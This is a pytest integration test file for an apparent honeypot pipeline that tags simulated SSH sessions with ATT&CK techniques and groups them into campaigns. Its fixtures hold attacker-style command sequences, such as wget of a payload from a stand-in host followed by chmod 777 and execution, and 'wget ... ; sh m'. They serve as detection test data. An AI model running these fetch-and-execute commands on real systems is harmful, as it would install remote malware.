"""ATT&CK tagging and campaign clustering against a real TimescaleDB, as the ingest role."""

from __future__ import annotations

import os
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any

import pytest
from sqlalchemy import text
from sqlalchemy.ext.asyncio import AsyncEngine, AsyncSession, async_sessionmaker

from ingest.attack import load_attack, sync_catalogue
from ingest.campaigns.cluster import ClusterConfig, ContentCache, run_cycle
from ingest.enrichment import GeoResolver
from ingest.enrichment.enricher import Enricher
from ingest.indicators import IndicatorExtractor, IndicatorSettings
from ingest.tagging import load_rules
from ingest.writer import write_batch

from .helpers import T0, make_event

pytestmark = [
    pytest.mark.integration,
    pytest.mark.skipif(not os.environ.get("POSTGRES_HOST"), reason="POSTGRES_HOST not set"),
]

RULES_DIR = Path(__file__).resolve().parents[1] / "rules"
RULES = load_rules(RULES_DIR)
ATTACK = load_attack(RULES_DIR)
LATER = T0 + timedelta(hours=2)  # every session is quiet by then
SCRIPT = ["uname -a", "cd /tmp", "wget http://{host}/x86", "chmod 777 x86", "./x86"]


def enricher(tmp_path: Path) -> Enricher:
    return Enricher(
        GeoResolver(tmp_path, fake_for_private=True),
        RULES,
        indicators=IndicatorExtractor(IndicatorSettings(keep_documentation=True)),
        attack=ATTACK,
    )


async def rows(engine: AsyncEngine, sql: str, **params: Any) -> list[Any]:
    async with engine.connect() as conn:
        return list((await conn.execute(text(sql), params)).all())


@pytest.fixture(autouse=True)
async def clean(engine: AsyncEngine) -> None:
    async with engine.begin() as conn:
        await conn.execute(
            text(
                "TRUNCATE campaigns, campaign_keys, campaign_sessions, technique_daily, "
                "attack_techniques CASCADE"
            )
        )


def shell_session(sid: str, ip: str, lines: list[str], offset: float = 0) -> list[Any]:
    events = [make_event("connect", sid=sid, ip=ip, offset_s=offset)]
    for i, line in enumerate(lines, 1):
        events.append(
            make_event("command", sid=sid, ip=ip, offset_s=offset + i, data={"input": line})
        )
        if line.startswith("wget "):
            events.append(
                make_event(
                    "download_attempt",
                    sid=sid,
                    ip=ip,
                    offset_s=offset + i + 0.5,
                    data={"url": line.split()[1], "tool": "wget"},
                )
            )
    return events


def script(host: str) -> list[str]:
    return [line.format(host=host) for line in SCRIPT]


async def test_events_and_sessions_carry_techniques_and_the_daily_table_counts_once(
    engine: AsyncEngine, factory: async_sessionmaker[AsyncSession], tmp_path: Path
) -> None:
    enr = enricher(tmp_path)
    first = shell_session("a", "192.0.2.1", script("203.0.113.66"))
    await write_batch(factory, first[:3], enr)
    await write_batch(factory, first[3:], enr)
    ev = await rows(
        engine, "SELECT techniques FROM events WHERE session_id = 'a' AND type = 'connect'"
    )
    assert ev[0].techniques is None
    ev = await rows(
        engine,
        "SELECT techniques FROM events WHERE session_id = 'a' AND data->>'input' = 'uname -a'",
    )
    assert "T1082" in ev[0].techniques
    sess = await rows(engine, "SELECT techniques FROM sessions WHERE session_id = 'a'")
    assert {"T1059.004", "T1082", "T1105"} <= set(sess[0].techniques)
    daily = await rows(
        engine,
        "SELECT sessions, events, sources FROM technique_daily "
        "WHERE technique = 'T1059.004' AND sensor = 'ssh'",
    )
    # Two batches, one session: the session is counted once, every event is counted.
    assert [(r.sessions, r.events, r.sources) for r in daily] == [(1, 5, 1)]


async def test_the_catalogue_sync_is_idempotent(
    engine: AsyncEngine, factory: async_sessionmaker[AsyncSession]
) -> None:
    assert await sync_catalogue(factory, ATTACK) == len(ATTACK.techniques)
    assert await sync_catalogue(factory, ATTACK) == len(ATTACK.techniques)
    n = await rows(engine, "SELECT count(*) AS n FROM attack_techniques")
    assert n[0].n == len(ATTACK.techniques)


async def test_a_script_seen_from_two_sources_becomes_a_campaign_that_grows_and_merges(
    engine: AsyncEngine, factory: async_sessionmaker[AsyncSession], tmp_path: Path
) -> None:
    enr = enricher(tmp_path)
    await sync_catalogue(factory, ATTACK)
    cfg = ClusterConfig()
    cache = ContentCache()

    # Two sources run the same script against different payload hosts, a third one is alone.
    batch = [
        *shell_session("a", "192.0.2.1", script("203.0.113.66")),
        *shell_session("b", "198.51.100.2", script("198.51.100.77"), offset=10),
        *shell_session("c", "203.0.113.3", ["id", "ls /root"], offset=20),
    ]
    await write_batch(factory, batch, enr)

    early = await run_cycle(factory, ATTACK, cfg, cache, now=T0 + timedelta(minutes=2))
    assert early.examined == 0  # still talking: not quiet for 10 minutes yet

    stats = await run_cycle(factory, ATTACK, cfg, cache, now=LATER)
    assert (stats.examined, stats.created, stats.joined) == (3, 1, 0)
    camp = await rows(engine, "SELECT * FROM campaigns")
    assert len(camp) == 1
    c = camp[0]
    assert c.sessions == 2
    assert c.sources == 2
    assert c.status == "active"
    assert c.severity == "severe"  # the session rules tag a download made executable malware-drop
    assert c.name.endswith(f"#{c.id}")
    assert "recon" in c.stages
    assert "tool_transfer" in c.stages
    assert c.rep_session_id in {"a", "b"}
    assert c.demo is False
    members = await rows(
        engine, "SELECT session_id, campaign_id, clustered_at FROM sessions ORDER BY session_id"
    )
    assert [(m.session_id, m.campaign_id) for m in members] == [
        ("a", c.id),
        ("b", c.id),
        ("c", None),
    ]
    assert members[0].clustered_at is not None
    assert members[2].clustered_at is None  # keyless but young: re-checked until 24 h old
    keys = await rows(engine, "SELECT kind FROM campaign_keys WHERE campaign_id = :c", c=c.id)
    # Only the script was seen from two networks: the single-source hosts are not stored.
    assert {k.kind for k in keys} == {"script"}
    links = await rows(engine, "SELECT count(*) AS n FROM campaign_sessions")
    assert links[0].n == 2

    # A new source with the same script joins even though it is the only new one.
    await write_batch(factory, shell_session("d", "192.0.2.4", script("192.0.2.9")), enr)
    stats = await run_cycle(factory, ATTACK, cfg, cache, now=LATER + timedelta(minutes=5))
    assert (stats.created, stats.joined) == (0, 1)
    camp = await rows(engine, "SELECT sessions, sources FROM campaigns")
    assert (camp[0].sessions, camp[0].sources) == (3, 3)

    # Nothing left to do: the next cycle is a no-op.
    stats = await run_cycle(factory, ATTACK, cfg, cache, now=LATER + timedelta(minutes=10))
    assert (stats.created, stats.joined, stats.merged) == (0, 0, 0)

    # A second campaign, from a shared payload host, then a session that bridges both.
    other = [
        *shell_session("e", "198.51.100.5", ["cd /tmp", "wget http://dl.example.net/m", "sh m"]),
        *shell_session("f", "203.0.113.6", ["wget http://dl.example.net/m", "sh m", "exit"], 10),
    ]
    await write_batch(factory, other, enr)
    await run_cycle(factory, ATTACK, cfg, cache, now=LATER + timedelta(minutes=20))
    assert (await rows(engine, "SELECT count(*) AS n FROM campaigns"))[0].n == 2

    bridge = shell_session("g", "203.0.113.7", script("dl.example.net"))
    await write_batch(factory, bridge, enr)
    stats = await run_cycle(factory, ATTACK, cfg, cache, now=LATER + timedelta(minutes=30))
    assert stats.merged == 1
    camps = await rows(
        engine, "SELECT id, status, merged_into, sessions FROM campaigns ORDER BY id"
    )
    assert [x.status for x in camps] == ["active", "merged"]
    assert camps[1].merged_into == camps[0].id
    assert camps[0].sessions == 3 + 2 + 1
    assert (
        await rows(
            engine,
            "SELECT count(DISTINCT campaign_id) AS n FROM sessions WHERE campaign_id IS NOT NULL",
        )
    )[0].n == 1


async def test_benign_sessions_are_never_clustered(
    engine: AsyncEngine, factory: async_sessionmaker[AsyncSession], tmp_path: Path
) -> None:
    enr = enricher(tmp_path)
    await write_batch(
        factory,
        [
            *shell_session("a", "192.0.2.1", script("203.0.113.66")),
            *shell_session("b", "198.51.100.2", script("203.0.113.66"), offset=10),
        ],
        enr,
    )
    async with engine.begin() as conn:
        await conn.execute(text("UPDATE sessions SET benign = true WHERE session_id = 'b'"))
    stats = await run_cycle(factory, ATTACK, ClusterConfig(), ContentCache(), now=LATER)
    assert (stats.examined, stats.created) == (1, 0)


async def test_old_sessions_that_never_matched_stop_being_rechecked(
    engine: AsyncEngine, factory: async_sessionmaker[AsyncSession], tmp_path: Path
) -> None:
    await write_batch(factory, shell_session("a", "192.0.2.1", ["id"]), enricher(tmp_path))
    await run_cycle(factory, ATTACK, ClusterConfig(), ContentCache(), now=LATER)
    # One command cannot carry a key: it is done at once.
    assert (await rows(engine, "SELECT clustered_at FROM sessions"))[0].clustered_at is not None


async def test_the_link_cap_bounds_campaign_sessions(
    engine: AsyncEngine, factory: async_sessionmaker[AsyncSession], tmp_path: Path
) -> None:
    enr = enricher(tmp_path)
    events = [
        e
        for i in range(6)
        for e in shell_session(
            f"s{i}",
            f"{('192.0.2', '198.51.100', '203.0.113')[i % 3]}.{i + 1}",
            script("203.0.113.66"),
            i * 20,
        )
    ]
    await write_batch(factory, events, enr)
    cfg = ClusterConfig(link_cap=4)
    await run_cycle(factory, ATTACK, cfg, ContentCache(), now=LATER)
    assert (await rows(engine, "SELECT sessions FROM campaigns"))[0].sessions == 6
    assert (await rows(engine, "SELECT count(*) AS n FROM campaign_sessions"))[0].n == 4


def test_helper_time_is_utc() -> None:
    assert T0.tzinfo is UTC and isinstance(T0, datetime)


async def test_a_keyed_session_that_matches_nothing_is_rechecked_for_thirty_days(
    engine: AsyncEngine, factory: async_sessionmaker[AsyncSession], tmp_path: Path
) -> None:
    await write_batch(
        factory, shell_session("a", "192.0.2.1", script("203.0.113.66")), enricher(tmp_path)
    )
    await run_cycle(factory, ATTACK, ClusterConfig(), ContentCache(), now=LATER)
    assert (await rows(engine, "SELECT clustered_at FROM sessions"))[0].clustered_at is None
    await run_cycle(factory, ATTACK, ClusterConfig(), ContentCache(), now=T0 + timedelta(days=31))
    assert (await rows(engine, "SELECT clustered_at FROM sessions"))[0].clustered_at is not None


async def test_an_untrusted_hash_never_links_sessions(
    engine: AsyncEngine, factory: async_sessionmaker[AsyncSession], tmp_path: Path
) -> None:
    """A hash typed into a command is text, not a digest a sensor computed."""
    digest = "a" * 64
    events = [
        *shell_session("a", "192.0.2.1", ["id", f"echo {digest}"]),
        *shell_session("b", "198.51.100.2", ["uname", f"echo {digest}"], offset=10),
    ]
    await write_batch(factory, events, enricher(tmp_path))
    stats = await run_cycle(factory, ATTACK, ClusterConfig(), ContentCache(), now=LATER)
    assert stats.created == 0
